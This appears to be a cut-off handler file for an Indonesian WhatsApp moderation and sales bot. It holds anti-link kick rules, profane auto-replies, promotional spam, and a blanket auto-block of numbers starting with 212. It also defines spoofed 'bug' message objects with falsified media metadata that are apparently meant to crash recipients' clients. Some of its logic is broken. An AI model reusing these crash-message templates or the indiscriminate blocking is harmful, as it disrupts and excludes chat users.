require('./all/settings')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys")
require("./all/global")
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./all/myfunc')
// read database
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const { Configuration, OpenAIApi } = require('openai')
const { color, bgcolor } = require('./all/color')
const { uptotelegra } = require('./all/upload')
const thumb = fs.readFileSync ('./thumb.png')
const pengguna = JSON.parse(fs.readFileSync('./all/database/owner.json'))
const isPremium = JSON.parse(fs.readFileSync('./all/database/premium.json'))
const isUser = pengguna.includes(m.sender)
module.exports = async (Biiofc, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '' //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const DigitalOcean = require('digitalocean');
const botNumber = await Biiofc.decodeJid(Biiofc.user.id)
const sender = m.key.fromMe ? (Biiofc.user.id.split(':')[0]+'@s.whatsapp.net' || Biiofc.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await Biiofc.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false 
const API_TOKEN = global.apitokendo;
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const jam = moment.tz('asia/jakarta').format("HH:mm:ss");
const hariini = moment.tz("Asia/Jakarta").format("dddd, DD MMMM YYYY");
const ffstalk = require('./scrape/ffstalk')
const { Client } = require('ssh2');
const { addSaldo, minSaldo, cekSaldo } = require("./all/database/deposit");
const { remini } = require('./freya/remini')
const jsobfus = require('javascript-obfuscator')
const { mediafireDl } = require('./all/database/mediafire.js') 
let db_saldo = JSON.parse(fs.readFileSync("./all/database/saldo.json"));
const pengguna = JSON.parse(fs.readFileSync('./database/user.json'))
const pler = JSON.parse(fs.readFileSync('./all/database/idgrup.json').toString())
const jangan = m.isGroup ? pler.includes(m.chat) : false

//ambilfitur
const more = String.fromCharCode(8206)
        const readmore = more.repeat(4001)
        const getCase = (cases) => {
            return "case  "+`'${cases}'`+fs.readFileSync("./appearance.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
        }

//antilink
let antipromosi = JSON.parse(fs.readFileSync('./database/antipromosi.json'))
let autojpm = JSON.parse(fs.readFileSync('./database/autojpm.json'))
let antivirus = JSON.parse(fs.readFileSync('./database/antivirus.json'))
let antipanel = JSON.parse(fs.readFileSync('./database/antipanel.json'))
let antitoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'))
let antiwame = JSON.parse(fs.readFileSync('./database/antiwame.json'))
let antilinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'))
let antilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'))
let antilinktwitter =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'))
let antilinktiktok =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'))
let antilinktelegram =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'))
let antilinkfacebook =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'))
let antilinkinstagram =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'))
let antilinkytchannel =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'))
let antilinkytvideo =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'))


//BanUser
const banUser = await Biiofc.fetchBlocklist

// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return Biiofc.updateBlockStatus(m.sender, 'block')

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `${randomcolor}`), color(`FROM`, `${randomcolor}`), color(`${pushname}`, `${randomcolor}`), color(`Text :`, `${randomcolor}`), color(`${body}`, `white`))
}

//total fitur
const totalFitur = () =>{
            var mytext = fs.readFileSync("./appearance.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }

// Database
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./all/database/owner.json"))

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot
// Jangan Di Edit Tar Error
let list = []
for (let i of ownerNumber) {
list.push({
displayName: await Biiofc.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await Biiofc.getName(i + '@s.whatsapp.net')}\n
FN:${await Biiofc.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:reyzoffc@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j\n
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await Biiofc.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
Biiofc.relayMessage(jid, order.message, { messageId: order.key.id})
}

// Function Reply
const reply = (teks) => { 
Biiofc.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "RaffHosting`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://lynk.id/Raffpanel", 
"sourceUrl": "https://lynk.id/Raffpanel" }}}, { quoted: m }) } 

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}


// Pastikan Anda memiliki API token yang valid dari DigitalOcean dan disimpan dalam variabel API_TOKEN

// fake quoted bug
const lep = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},
'message': {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
'isAnimated': []
}}}

const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 60,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `Bot Bug ᭖͜͡Raff Hosting`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;RaffofcBot,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/63e5b663b9883c6de9824.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
 // Antipromosi
  if (antipromosi)
  if (budy.includes(`admin panel 5k`)) {
if (!isBotAdmins) return
bvl = `\`\`\`KONTOL MINIMAL JGN RUSAK HARGA ANJING\`\`\`\n\nKEBELET DUIT YA DECK?`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
kice = m.sender
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`KONTOL MINIMAL JGN RUSAK HARGA ANJING\`\`\`\n\nKEBELET DUIT YA DECK?`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antipromosi)
  if (budy.includes(`admin panel 10k`)) {
if (!isBotAdmins) return
bvl = `\`\`\`KONTOL MINIMAL JGN RUSAK HARGA ANJING\`\`\`\n\nKEBELET DUIT YA DECK?`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
kice = m.sender
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`KONTOL MINIMAL JGN RUSAK HARGA ANJING\`\`\`\n\n@KEBELET DUIT YA DECK?`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antipromosi)
  if (budy.includes(`35k`)) {
if (!isBotAdmins) return
bvl = `\`\`\`KONTOL MINIMAL JGN RUSAK HARGA ANJING\`\`\`\n\nKEBELET DUIT YA DECK?`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
kice = m.sender
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antipromosi)
  if (budy.includes(`25k`)) {
if (!isBotAdmins) return
bvl = `\`\`\`KONTOL MINIMAL JGN RUSAK HARGA ANJING\`\`\`\n\nKEBELET DUIT YA DECK?`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
kice = m.sender
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`KONTOL MINIMAL JGN RUSAK HARGA ANJING\`\`\`\n\nKEBELET DUIT YA DECK?`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antipromosi)
  if (budy.includes(`40k`)) {
if (!isBotAdmins) return
bvl = `\`\`\`KONTOL MINIMAL JGN RUSAK HARGA ANJING\`\`\`\n\nKEBELET DUIT YA DECK?`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
kice = m.sender
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antipromosi)
  if (budy.includes(`free`)) {
if (!isBotAdmins) return
bvl = `\`\`\`KONTOL MINIMAL JGN RUSAK HARGA ANJING\`\`\`\n\nKEBELET DUIT YA DECK?`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
kice = m.sender
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`KONTOL MINIMAL JGN RUSAK HARGA ANJING\`\`\`\n\nKEBELET DUIT YA DECK?`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
// auto jpm
        if (autojpm) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return reply(mess.only.badmin)
        let gclink = (`https://chat.whatsapp.com/`+await Biiofc.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return Biiofc.sendMessage(m.chat, {text: `\`\`\`JOIN GUYS 700 MEMBER SUKA BAGI BAGI VPS DAN ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j`})
        if (isAdmins) return Biiofc.sendMessage(m.chat, {text: `\`\`\`JOIN GUYS 700 MEMBER SUKA BAGI BAGI VPS DAN ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j`})
        if (!isOwner) return Biiofc.sendMessage(m.chat, {text: `\`\`\`JOIN GUYS 700 MEMBER SUKA BAGI BAGI VPS DAN ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j`})
        kice = m.sender
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			Biiofc.sendMessage(from, {text:`\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }
        
        // Anti Panel
        if (antipanel) {
        if (budy.match(`panel`)) {
        if (!isBotAdmins) return reply(mess.only.badmin)
        let gclink = (`Panel`+await Biiofc.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return Biiofc.sendMessage(m.chat, {text: `「 *ANTI PROMOSI PANEL* 」\n\nApa? Panel? Beli Di Admin Sini Aja, Yg Lain Jelek, Cepet Down, Lemot, Banyak Masalah!\n\nMau? Chat Ke:\nwa.me/62895354709030`})
        if (isAdmins) return Biiofc.sendMessage(m.chat, {text: `「 *ANTI PROMOSI PANEL* 」\n\nApa? Panel? Beli Di Admin Sini Aja, Yg Lain Jelek, Cepet Down, Lemot, Banyak Masalah!\n\nMau? Chat Ke:\nwa.me/62895354709030`})
        if (!isOwner) return Biiofc.sendMessage(m.chat, {text: `「 *ANTI PROMOSI PANEL* 」\n\nApa? Panel? Beli Di Admin Sini Aja, Yg Lain Jelek, Cepet Down, Lemot, Banyak Masalah!\n\nMau? Chat Ke:\nwa.me/62895354709030`})
        kice = m.sender
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			Biiofc.sendMessage(from, {text:`\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\n@${kice.split("@")[0]} https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }
        
// Anti Link
        if (antilinkgc) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return reply(mess.only.badmin)
        let gclink = (`https://chat.whatsapp.com/`+await Biiofc.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return Biiofc.sendMessage(m.chat, {text: `\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j`})
        if (isAdmins) return Biiofc.sendMessage(m.chat, {text: `\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j`})
        if (!isOwner) return Biiofc.sendMessage(m.chat, {text: `\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j`})
        kice = m.sender
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			Biiofc.sendMessage(from, {text:`\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\n@${kice.split("@")[0]} https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }

 // Antiwame by xeon
  if (antiwame)
  if (budy.includes(`wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
kice = m.sender
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antiwame)
  if (budy.includes(`wa.me/`)) {
if (!isBotAdmins) return
bvl = `\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
kice = m.sender
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antivirus by xeon
  if (antivirus) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return reply(mess.only.badmin)
          await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			Biiofc.sendMessage(from, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//antilink youtube video by xeon
if (antilinkytvideo)
if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by xeon
if (antilinkytchannel)
   if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube channel link in this group`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
//antilink instagram by xeon
if (antilinkinstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending instagram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by xeon
if (antilinkfacebook)
   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending facebook link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by xeon
if (antilinktelegram)
   if (budy.includes("https://t.me/")){
if (antilinktelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin has sent a telegram link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending telegram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink tiktok by xeon
if (antilinktiktok)
   if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin has sent a tiktok link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending tiktok link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by xeon
if (antilinktwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin has sent a twitter link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
